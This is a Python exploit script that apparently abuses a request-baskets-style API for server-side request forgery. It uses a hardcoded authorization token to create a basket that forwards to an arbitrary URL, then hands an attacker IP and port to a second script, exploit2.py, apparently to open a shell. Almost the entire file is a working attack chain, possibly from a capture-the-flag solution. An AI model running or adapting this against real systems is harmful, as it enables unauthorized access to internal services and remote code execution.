import requests
import sys
import base64
import os

if len(sys.argv) < 6:
    print("Usage: python3 exploit.py base_url basket_name forward_url ip port")
    sys.exit(1)
ip = sys.argv[4]
port = sys.argv[5]
base_url = f"{sys.argv[1]}/api/baskets/{sys.argv[2]}"
forward_url = sys.argv[3]
new_url = f"{sys.argv[1]}/{sys.argv[2]}"
headers = {
    "Authorization": "IH_V8fXJZbGZflkaVd8UPRGaR1VYsTLZntU4joOlxS2z",
    "X-Requested-With": "XMLHttpRequest",
    "Accept": "application/json, text/javascript, */*; q=0.01",
}

payload = {
    "forward_url": forward_url,
    "proxy_response": True,
    "insecure_tls": True,
    "expand_path": True,
    "capacity": 200
}

response = requests.put(base_url, json=payload, headers=headers)
#print(response.status_code)
#print(response.content)
#print(new_url)

response2 = requests.get(new_url)
#print(response2.status_code)

if response2.status_code != 200:
    print("Attack Failed")
    sys.exit(2)
else:
    os.system(f"python3 exploit2.py {ip} {port} {new_url}")
